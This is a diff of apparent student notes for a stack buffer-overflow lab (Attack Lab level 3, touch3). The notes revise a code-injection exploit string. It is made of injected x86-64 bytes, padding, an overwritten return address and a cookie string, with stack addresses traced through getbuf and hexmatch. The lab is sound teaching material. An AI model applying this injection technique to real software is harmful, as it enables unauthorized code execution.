@@ -76,43 +76,28 @@ hexmatch
 (11)*0x401854(after allocating stack)      0x5561dc00
 (12)*0x4018f9(after deallocating stack)    0x5561dc98
 injected code
-(13)*0x5561dc90
+(13)*0x5561dc78
 Order in which breakpoints will encounter with injected code
 1-3-4-7-8-5-6-2-9-11-12-10
 Order in which breakpoints will encounter with injected code
 1-3-4-7-8-5-6-13-9-11-12-10
 After observing code for hexmatch we see that it modifies memory address 0x5561dc78
-Which happens to be start address for buffer allocated in getbuf function. So should
-start our injected code from address 0x5561dc80 or 0x5561dc88
-first place string representation of cookies from address 0x5561dc80-0x5561dc88 (8+1bytes)
-then place code for setting pointer to our cookie string from address 0x5561dc90. And this is
-the return address from getbuf function.
-exploit string
-00 00 00 00 00 00 00 00  
-35 39 62 39 39 37 66 61 /* string representation of cookie */
-00 00 00 00 00 00 00 00
-48 c7 c7 80 dc 61 55 c3 /* injected code */
-00 00 00 00 00 00 00 00 /* first 40 bytes as padding string */
-90 dc 61 55 00 00 00 00 /* return address of injected code */
-fa 18 40 00 00 00 00 00 /* return address of touch3 */
+Which happens to be start address for buffer allocated in getbuf function. 
+Below in expliot string. Here we have injected code at address 0x5561dc78 which
+is a start of buffer allocated. And set our string representation of cookie at
+address 0x5561dcb0-0x5561dcb8 which will not be modified by touch3 or hexmatch.
 
-Total: 18 eight byte values
-11 11 11 11 11 11 11 11 /* 0x5561dc78 */
-22 22 22 22 22 22 22 22 /* 0x5561dc70 */
-33 33 33 33 33 33 33 33 /* 0x5561dc68 */
-44 44 44 44 44 44 44 44 /* 0x5561dc60 */
-55 55 55 55 55 55 55 55 /* 0x5561dc58 */
-fa 18 40 00 00 00 00 00 /* 0x5561dc50 */
-77 77 77 77 77 77 77 77 /* 0x5561dc48 */
-88 88 88 88 88 88 88 88 /* 0x5561dc40 */
-99 99 99 99 99 99 99 99 /* 0x5561dc38 */
-aa aa aa aa aa aa aa aa /* 0x5561dc30 */
-bb bb bb bb bb bb bb bb /* 0x5561dc28 */
-cc cc cc cc cc cc cc cc /* 0x5561dc20 */
-dd dd dd dd dd dd dd dd /* 0x5561dc18 */
-ee ee ee ee ee ee ee ee /* 0x5561dc10 */
-ff ff ff ff ff ff ff ff /* 0x5561dc08 */
-11 11 11 11 11 11 11 11 /* 0x5561dc00 */
-22 22 22 22 22 22 22 22 /* 0x5561dbf8 */
-33 33 33 33 33 33 33 33 /* 0x5561dbf0 */
+exploit string
+0x5561dc78: 48 c7 c7 b0 dc 61 55 c3 /* injected code */
+0x5561dc80: 00 00 00 00 00 00 00 00 
+0x5561dc88: 00 00 00 00 00 00 00 00
+0x5561dc90: 00 00 00 00 00 00 00 00
+0x5561dc98: 00 00 00 00 00 00 00 00 /* first 40 bytes as padding string */
+0x5561dca0: 78 dc 61 55 00 00 00 00 /* return address of injected code */
+0x5561dca8: fa 18 40 00 00 00 00 00 /* return address of touch3 */
+0x5561dcb0: 35 39 62 39 39 37 66 61 /* string representation of cookie */
+0x5561dcb8: 00 00 00 00 00 00 00 00  
+=======================================================
+=================Level 4===============================
+
 =======================================================
